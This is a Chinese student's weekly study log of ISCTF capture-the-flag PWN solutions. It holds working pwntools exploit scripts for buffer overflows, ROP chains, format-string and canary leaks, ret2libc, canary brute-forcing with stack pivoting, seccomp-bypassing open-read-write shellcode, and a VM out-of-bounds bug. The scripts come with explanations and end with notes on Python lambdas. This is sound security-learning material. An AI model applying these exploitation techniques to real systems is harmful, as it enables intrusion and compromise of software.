# <font style="color:rgb(38, 38, 38);">完成事项</font>
+ ISCTF

# <font style="color:rgb(38, 38, 38);">下周待做事项</font>
+ 复盘题目，汇编学习,python学习

# <font style="color:rgb(38, 38, 38);">本周学习的知识分享</font>
## PWN
### 签到
``` c
 if ( buf[27] == -1378178390 )
```
由伪代码可知，只需将buf27的数字填成-1378178390即可，脚本如下
```python
#! /usr/bin/env python3
from pwn import *
p =remote("challenge.bluesharkinfo.com",23049)
#p = process('./IS1')
p.recvuntil(b'do you like blueshark?\n')
value = -1378178390
payload = b'A' * 108 + p32(value,signed=True)
p.sendline(payload)
p.interactive()
```
### ret2rop
``` python
#! /usr/bin/env python3
from pwn import *
context.os = "linux"
context.arch = "amd64"
# context.terminal = ['gnome-terminal', '-e', 'sh', '-c']
elf = ELF("./is2")
p = process("./is2")
#p = remote("challenge.bluesharkinfo.com", 25636)
p.recvuntil(b'if you want to watch demo\n')
p.sendline(b"no")
p.recvuntil(b'please int your name\n')
p.sendline(b"/bin/sh\x00")
p.recvuntil(b'please introduce yourself\n')
name_addr = 0x4040F0
pop_rsi_addr = 0x401a1c 
mov_rdi_rsi_addr = 0x401a25 
system_addr = elf.plt['system']
real = flat([pop_rsi_addr,name_addr,mov_rdi_rsi_addr,system_addr])
payload = b"\x00" * 120
payload += real
payload = payload.ljust(0x100, b"\x00")
p.sendline(payload)
p.interactive()
```
这个题目中我们只能找到mov rdi, rsi ; ret,pop rsi ; ret,那就这样子构造ROP链，同时注意到存在数组越界，同时加密部分是异或加密，根据异或加密的性质，我们将ROP放到120处，这样子前面88-120处就会被异或成ROP
### ezfmt
``` python
#! /usr/bin/env python3
from pwn import*
context.os = "linux"
context.arch="amd64"
elf=ELF("./is3")
p=remote("challenge.bluesharkinfo.com",29196)
#p = process("./is3")
p.recvuntil(b"1st input: ")
p.sendline(b"%23$p-%25$p")
p.recvuntil(b"0x")
leak_canary = int(p.recvuntil(b"-", drop=True), 16)
p.recvuntil(b"0x")
leak_code_addr = int(p.recvuntil(b"\n", drop=True), 16)
offset = 0x135b
elf.address = leak_code_addr - offset
ret_offset= 0x000000000000101a
ret_addr = elf.address + ret_offset
p.recvuntil(b'2nd input: ')
payload = flat([b'a' * 136, leak_canary,b'a'*8,p64(ret_addr),elf.sym['win']])
p.sendline(payload)
p.interactive()
```
通过计算，我们可以泄露出canary和win，通过GDB调试，可以算出偏移是0x135b,这样子，我们可以算出真实基地址，之后通过已知偏移可以算出其他真实地址，之后我们直接跳转到win函数即可
### 2048
```python
#! /usr/bin/env python3
from pwn import*
from LibcSearcher import *
#p=remote("challenge.bluesharkinfo.com",20996)
context.arch = 'amd64'
context.os = 'linux'
p=process("./is4")
elf = ELF("./is4")
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main_addr = elf.sym['main']
pop_rdi = 0x000000000040133e
sys_addr = 0x401361
p.sendline("a")
for i in range(0,6):
    p.sendline("q")
    p.sendline("a")
p.sendline("q")
p.sendline("q")
p.recvuntil(b"$ ")
p.send(b'a'*137)
p.recvuntil(b'a'*137)
canary_data = p.recv(7)
canary_data = canary_data.rjust(8,b'\x00')
canary_data = u64(canary_data)
print(hex(canary_data))
payload = flat([b"exit\x00" + b"a" * 131,canary_data,b"a"*8,pop_rdi,puts_got,puts_plt,main_addr])
p.recvuntil(b"$ ")
p.sendline(payload)
p.recvuntil(b"executing command: exit\n")
leak_addr = p.recvuntil(b"\n", drop=True) 
if len(leak_addr) > 6: 
    leak_addr = leak_addr[:6]
leak_addr = u64(leak_addr.ljust(8, b'\x00'))
print(hex(leak_addr))
libc = LibcSearcher("puts", leak_addr)
libc_base = leak_addr - libc.dump("puts")
system_addr = libc_base + libc.dump("system")
bin_sh_addr = libc_base + libc.dump("str_bin_sh")
p.sendline("a")
for i in range(0,6):
    p.sendline("q")
    p.sendline("a")
p.sendline("q")
p.sendline("q")
p.recvuntil(b"$ ")
p.send(b'a'*137)
p.recvuntil(b'a'*137)
canary_data = p.recv(7)
canary_data = canary_data.rjust(8,b'\x00')
canary_data = u64(canary_data)
print(hex(canary_data))
payload = flat([b"exit\x00" + b"a" * 131,canary_data,b'a'*8,pop_rdi + 1,pop_rdi, bin_sh_addr,system_addr])
p.sendline(payload)
p.interactive()
```
```c
if ( (unsigned int)score <= 0x1869F )
```
我们先通过回环，让程序先通过检查，进入到shell函数中，之后我们发现只能输入exit ls，那么想要结束循环我们必须输入exit,之后就是公式化的泄露canary，打印puts地址，算出libc基地址，在算出其他函数字符串的地址，之后再来一轮进行一个常规的ROP即可
### ezstack
```c
__int64 sub_1637()
{
  sub_13B3(0LL, (__int64)a2, 4096);
  return 0LL;
}
//必须满足(ret_addr & 0xff) == 0x9b才能正常返回，否则 exit
cmp    byte ptr [rbp+8], 0x9b 
jne    error_exit
```
```python
#! /usr/bin/env python3
from pwn import *
context.arch = 'amd64'
context.log_level = 'info'
IP = 'challenge.bluesharkinfo.com'
PORT = 21886
def get_conn(mute=False):
    if mute:
        return remote(IP, PORT, level='error')
    return remote(IP, PORT)
canary = b'\x00'
sc_stager = asm('pop rsi; xor rdi,rdi; syscall; jmp rsi').ljust(16, b'\x90')
for i in range(7):
    for b in range(256):
        try:
            p = get_conn(mute=True)
            p.send(sc_stager)
            p.recvuntil(b"GIFT?\n")
            p.recvlines(2)
            payload = b'A'*264 + canary + p8(b)
            p.send(payload)
            msg = p.recvall(timeout=0.2)  
            if b"stack smashing" not in msg:
                canary += p8(b)
                p.close()
                break
            p.close()
        except Exception as e:
            p.close()
p = get_conn()
p.send(sc_stager)
p.recvuntil(b"GIFT?\n")
leak_main = u64(p.recvline()[:-1].ljust(8, b'\0'))
leak_stack = u64(p.recvline()[:-1].ljust(8, b'\0'))
magic = leak_main + 0x4c
buf_addr = leak_stack - 0xe8 
payload = flat([b'A' * 8,0x114514000,0x114514010,b'A' * 240,canary,buf_addr, magic])
p.sendline(payload)
sleep(0.1)
sh = shellcraft.open('flag') 
sh += shellcraft.read('rax', 'rsp', 100) 
sh += shellcraft.write(1, 'rsp', 100)
p.sendline(b'\x90'*64 + asm(sh))
try:
    print(p.recvall(timeout=3).decode().strip())
except:
    p.interactive()
```
程序初始化了一个 0x114514000 的 RWX 段，main 开头允许写入 16 字节，明显的 Stager 坑位。 漏洞点在sub_1637，存在栈溢出，但返回时检查返回地址结尾是否为0x9b。同时Seccomp禁用execve，需要 ORW。利用思路：1.Canary爆破：远程是Fork进程,Canary不变，逐字节爆破。2.Stack Pivot：找到 main 结尾的 leave; ret(地址结尾 289b，满足检查)，配合栈溢出修改rbp劫持栈到输入缓冲区。3.Stager：开头16字节写不完 ORW，构造pop rsi; jmp rsi的Stager，配合栈迁移后的布局，跳转过来读入并执行ORW。
### VM
``` python
#! /usr/bin/env python3
from pwn import *
s   = lambda data : p.send(data)
sl  = lambda data : p.sendline(str(data))
sa  = lambda text, data : p.sendafter(text, data)
sla = lambda text, data : p.sendlineafter(text, data)
r   = lambda num=4096 : p.recv(num)
rl  = lambda text : p.recvuntil(text)
lg  = lambda s, num : p.success('%s -> 0x%x' % (s, num))
context(os='linux', arch='amd64', log_level='debug')
# p = process(['./ld-linux-x86-64.so.2', './is6'])
p = remote("challenge.bluesharkinfo.com", 26303)
elf = ELF('./is6')
libc = ELF('./libc.so.6')
def cmd(opcode, target, op1, op2):
    payload = (opcode & 0xFF) | ((target & 0xFF) << 8) | ((op1 & 0xFF) << 16) | ((op2 & 0xFF) << 24)
    sl(payload)
def make_const(val, reg_idx):
    cmd(3, 2, 0, 0)
    cmd(1, reg_idx, reg_idx, reg_idx)
    for i in range(63, -1, -1):
        cmd(4, reg_idx, reg_idx, 2)
        if (val >> i) & 1:
            cmd(0, reg_idx, reg_idx, 2)
def push_rop_val(val):
    make_const(val, 3)
    cmd(0, 3, 3, 0)
    cmd(7, 3, 0, 0)
cmd(0, 0, -4, -3) 
stderr_offset = libc.sym['_IO_2_1_stderr_']
make_const(stderr_offset, 1)
cmd(1, 0, 0, 1)
lg("Libc Base obtained via VM", 0)
for _ in range(513): 
    cmd(7, 0, 0, 0)
cmd(8, 1, 0, 0)
cmd(7, 1, 0, 0) 
cmd(7, 1, 0, 0) 
cmd(7, 1, 0, 0) 
pop_rdi = 0x000000000002a3e5 
pop_rsi = 0x000000000002be51
pop_rdx_r12 = 0x000000000011f2e7 
addr_open  = libc.sym['open']
addr_read  = libc.sym['read']
addr_write = libc.sym['write']
addr_bss   = libc.bss() + 0x800
push_rop_val(pop_rdi)
make_const(0, 4); cmd(7, 4, 0, 0)
push_rop_val(pop_rsi)
push_rop_val(addr_bss)
push_rop_val(pop_rdx_r12)
make_const(100, 4); cmd(7, 4, 0, 0)
make_const(0, 4);   cmd(7, 4, 0, 0)
push_rop_val(addr_read)
push_rop_val(pop_rdi)
push_rop_val(addr_bss)
push_rop_val(pop_rsi)
make_const(0, 4); cmd(7, 4, 0, 0)
push_rop_val(addr_open)
push_rop_val(pop_rdi)
make_const(3, 4); cmd(7, 4, 0, 0)
push_rop_val(pop_rsi)
push_rop_val(addr_bss)
push_rop_val(pop_rdx_r12)
make_const(100, 4); cmd(7, 4, 0, 0)
make_const(0, 4);   cmd(7, 4, 0, 0)
push_rop_val(addr_read)
push_rop_val(pop_rdi)
make_const(1, 4); cmd(7, 4, 0, 0)
push_rop_val(pop_rsi)
push_rop_val(addr_bss)
push_rop_val(addr_write)
sl(9)
sleep(1)
s(b"flag\x00") 
p.interactive()
```
逆向分析opcode发现存在数组越界漏洞（OOB）。首先VM的寄存器reg位于.bss段。在reg数组的低地址方向（负偏移处），存放着stderr指针。由于VM的算术指令（如ADD）未检查下标符号，我们可以通过负数下标直接读取stderr的值。接着VM内部维护了一个栈数组v9（位于真实栈上），并使用变量v6作为栈顶指针。VM的PUSH（Case 7）和POP（Case 8）指令未检查v6是否超出了数组边界（512）。由于栈偏移可能存在微小误差或对齐问题，直接连续多次Push Canary以确保覆盖正确的栈位置。 最后，由于Seccomp禁用了execve，利用VM的Push指令在栈上构造ORW ROP链，读取flag。

# <font style="color:rgb(38, 38, 38);">杂项</font>
+ python 封装函数
* lambda 参数1,参数2,参数3 : 表达式
  - lambda : 声明关键字
  - 参数: 使用逗号隔开
  - 冒号: 分隔符
  - 表达式: 函数的执行逻辑，执行完这行代码的结果会自动被 return
  - 对比:
  ``` python
  def square(x):
      return x * x
  print(square(5)) 
  ```
  ``` python
  square = lambda x : x * x
  print(square(5)) 
  ```
+ ```python
  def cmd(opcode, target, op1, op2):
      payload = (opcode & 0xFF) | ((target & 0xFF) << 8) | ((op1 & 0xFF) << 16) | ((op2 & 0xFF) << 24)
      sl(payload)
  sl  = lambda data : p.sendline(str(data))
  ```
+ range的使用方法
 ```python
 range(start,stop,step)
 #start：开始的数字（包含）。
 #stop：结束的数字（不包含，也就是到了这个数就停，不执行这个数）。
 #step：步长（每次加多少，负数代表减）。
 ```
# <font style="color:rgb(38, 38, 38);">总结</font>
 - 1.python封装函数
 - 2.了解虚拟机pwn，盲pwn大致情况
 - 3.学习GDB相关调试
 - 4.之后有时间继续研究虚拟机pwn和ezstack